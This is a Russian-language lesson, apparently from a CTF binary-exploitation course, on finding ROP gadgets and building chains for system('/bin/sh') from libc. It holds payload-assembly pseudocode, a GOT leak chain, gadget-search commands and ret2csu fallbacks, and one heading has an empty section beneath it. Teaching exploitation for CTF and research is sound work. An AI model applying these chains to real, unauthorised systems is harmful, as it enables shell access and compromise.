## Вопрос, с которого всё начинается

Ты хочешь вызвать `system("/bin/sh")`. Для этого надо **положить адрес строки `/bin/sh` в регистр `rdi`** (первый аргумент) и затем передать управление `system`. Но как «положить в регистр» из цепочки на стеке, если мы только возвращаемся по адресам? Ответ — **гаджет**: короткая последовательность инструкций, заканчивающаяся на `ret`, среди которой есть нужный `pop rdi`. В этом уроке мы найдём такой гаджет для конкретного бинарника.

## Наш пример

Возьмём маленький бинарник `ret2win` (небольшая программа, где есть переполнение стека) и поищем в нём гаджеты. Инструмент — **ROPgadget**: он разбирает код и печатает все последовательности, заканчивающиеся на `ret`.

```
$ ROPgadget --binary ret2win
...
Unique gadgets found: 62
```

62 гаджета — уже что-то. Теперь главный вопрос: **есть ли среди них `pop rdi; ret`?**

```
$ ROPgadget --binary ret2win | grep 'pop rdi'
```

Вывод пустой. Гаджета нет. И это нормально: бинарник крошечный, в нём просто нет инструкции `pop rdi` в подходящем месте. Запомним вывод: **маленький бинарник может не содержать нужного гаджета — тогда его берут из библиотеки.**

## Шаг 1: что именно нам нужно

Для вызова `system("/bin/sh")` по соглашению System V (мы проходили его в уроке про соглашения вызовов) нужен **один** аргумент — он идёт в `rdi`. Значит, нам нужен гаджет, который делает `pop rdi; ret`:

- `pop rdi` — снимает со стека следующее значение и кладёт его в `rdi`;
- `ret` — уходит на следующий адрес в цепочке.

Схема цепочки будет такой:

```
[адрес pop rdi; ret] [адрес строки "/bin/sh"] [адрес system]
```

Три «слова» на стеке: сначала прыгаем на гаджет, он забирает второе слово в `rdi`, затем `ret` уводит на `system`.

## Шаг 2: берём гаджет из libc

Раз в бинарнике нет `pop rdi; ret`, поищем в **libc** — большой библиотеке, где таких гаджетов сколько угодно:

```
$ ROPgadget --binary /usr/lib/libc.so.6 | grep 'pop rdi ; ret'
0x000000000010269a : pop rdi ; ret
```

Есть. Но адрес `0x10269a` — это **смещение внутри libc**, а не абсолютный адрес. Чтобы получить реальный адрес, нужно знать **базу libc** в этом запуске (её рандомизирует ASLR). Базу находят по **утечке**: если программа где-то печатает адрес функции из libc, из него вычитают смещение этой функции и получают базу.

```
реальный_адрес_гаджета = база_libc + 0x10269a
```

Точно так же ищется и сама строка `/bin/sh`:

```
$ strings -a -t x /usr/lib/libc.so.6 | grep '/bin/sh'
 1b0192 /bin/sh
```

То есть `"/bin/sh"` лежит по смещению `0x1b0192` от базы libc.

## Шаг 3: другие инструменты

`ROPgadget` — не единственный. Полезно знать:

- **ropper** — аналог с более гибким поиском и «семантическими» запросами (например, найти цепочку, которая делает нужный эффект). Установка: `pip install ropper`.
- **pwntools `ROP`** — встроенный в pwntools: сам загружает ELF и умеет искать гаджеты программно:

```
$ python3 -c "from pwn import *; r=ROP(ELF('ret2win',checksec=False)); print(r.find_gadget(['ret']))"
Gadget(0x40101a, ['ret'], [], 0x4)
```

- **one_gadget** — отдельный инструмент для libc: находит места, откуда можно сразу получить shell одним прыжком, **без** сборки цепочки. Проверь ограничения на регистры перед прыжком — иначе shell не поднимется.

Полезно знать про производительность: `ROPgadget` по умолчанию перебирает все смещения и на большой libc работает долго. Ключи `--depth 5` (ограничить длину гаджета) и `--only "pop|ret"` (оставить только нужные инструкции) заметно ускоряют поиск. А `--filter` убирает нежелательные байты, если ввод обрезается по определённым символам.

## Шаг 4: собираем цепочку целиком

Итоговая ROP-цепочка для `system("/bin/sh")` выглядит так (псевдокод):

```python
payload  = b'A' * offset
payload += p64(libc_base + pop_rdi)      # 1) кладём в rdi ...
payload += p64(libc_base + binsh)        # 2) ... адрес строки "/bin/sh"
payload += p64(libc_base + system)       # 3) вызываем system(rdi)
```

Три строки — и мы вызвали функцию с нужным аргументом, не имея ни одной подходящей инструкции в самой программе. Если бы в бинарнике был свой `pop rdi; ret` (например, в большой программе) — использовали бы его и обошлись без утечки libc.

## Шаг 5: из гаджетов — в длинную цепочку

Одна «тройка» адресов — только начало. Реальные цепочки собираются из **десятков** гаджетов, каждый делает микро-шаг: загрузить регистр, вызвать функцию, записать значение по адресу. Схема вызова `write(1, got_puts, 8)` (утечка адреса `puts` в libc) выглядит так:

```python
chain  = p64(pop_rdi) + p64(1)              # rdi = 1 (stdout)
chain += p64(pop_rsi_r15) + p64(got_puts)   # rsi = адрес записи GOT
chain += p64(0)                             # «мусор» для r15 (гаджет pop rsi; pop r15; ret)
chain += p64(pop_rdx) + p64(8)              # rdx = 8 (сколько байт)
chain += p64(puts_plt)                      # вызов write/puts
```

Обрати внимание на гаджет `pop rsi; pop r15; ret`: он «съедает» **два** слова со стека, поэтому после адреса `rsi` обязательно кладут заглушку под `r15`. Забыть про неё — классическая ошибка, из-за которой цепочка «разъезжается» и падает на середине.

Именно так появляется **утечка**: программа печатает реальный адрес `puts` из GOT, ты вычитаешь известное смещение `puts` в libc и получаешь базу. После этого вычисляешь `pop_rdi`, `/bin/sh` и `system` — и возвращаешься в уязвимую функцию, чтобы отправить **вторую** цепочку, уже вызывающую shell.

## Шаг 6: если гаджета всё равно нет

Бывает и так, что нужного гаджета нет ни в бинарнике, ни в libc. Тогда:

- **Ищи эквивалент.** Вместо `pop rdi; ret` подойдёт `pop rdi; pop rbp; ret` — просто добавь заглушку под `rbp`.
- **Используй ret2csu.** В бинарниках, собранных с glibc, есть функция `__libc_csu_init` с готовым набором `pop`-инструкций для `rbx/rbp/r12..r15` и `call` — из неё собирают вызов с любыми аргументами.
- **Возьми гаджет из другого модуля** (ld.so, libpthread) — лишь бы он был загружен.
- **Собери цепочку из «полу-гаджетов»** и совмести их — важно только, что исполнение доходит до `ret`.

## Инструмент: nm — таблица символов

`nm` перечисляет символы бинарника: имена функций и глобальных переменных с их адресами. Если символы не срезаны, это самый быстрый способ найти нужную функцию.

Ключи, которые пригодятся:
* `nm <файл>` — все символы с адресами;
* `nm -C <файл>` — демутируй C++-имена (читаемые сигнатуры);
* `T`/`t` — код (глобальный/локальный), `R`/`r` — только чтение (`.rodata`), `D`/`B` — данные;
* нижний регистр = локальный символ, верхний = глобальный/экспортируемый.

### Рабочий пример (как в лаборатории)


## Инструмент: objdump — дизассемблер

`objdump` показывает машинный код бинарника в виде ассемблера. Именно по нему считают смещения буферов, находят вызовы и адреса — основа статического разбора.

Ключи, которые пригодятся:
* `objdump -d <файл>` — дизассемблировать секцию `.text` (машинный код функций);
* `objdump -d <файл> | less` — листать вывод, искать нужную функцию по имени;
* `objdump -M intel -d <файл>` — синтаксис Intel (привычнее, чем AT&T);
* в выводе важны пролог функции (`push rbp; mov rbp,rsp`) и `sub rsp,N` — по нему видно размер кадра.

## Что мы теперь знаем

- **Гаджет** — короткая последовательность инструкций, заканчивающаяся на `ret`; из них собирается ROP-цепочка.
- **`pop rdi; ret`** нужен, чтобы задать первый аргумент функции.
- Маленький бинарник может **не содержать** нужного гаджета — тогда его берут из libc.
- Адрес гаджета в libc — это **смещение**, к которому нужно прибавить базу libc (из утечки).
- Инструменты: `ROPgadget`, `ropper`, pwntools `ROP`, `one_gadget`.

## Куда дальше

Мы научились находить гаджеты и поняли, что маленькому бинарнику нужен libc. Дальше разберём **`ret2libc`** целиком: как именно получить утечку, определить версию libc и собрать `system("/bin/sh")` от начала до конца. А пока запомни главное: **гаджет — это кусочек чужого кода с `ret` на конце, и нужный кусочек не обязательно есть в самой программе.**

## Где пригодится

- **CTF Pwn:** поиск гаджетов — ежедневная задача; без него не собрать цепочку.
- **Обход NX:** ROP-цепочки строятся только из гаджетов.
- **Vulnerability research:** современные эксплойты — это длинные цепочки гаджетов.
- **Реальные CVE:** эксплуатация браузеров и ядра почти всегда включает ROP/JOP.
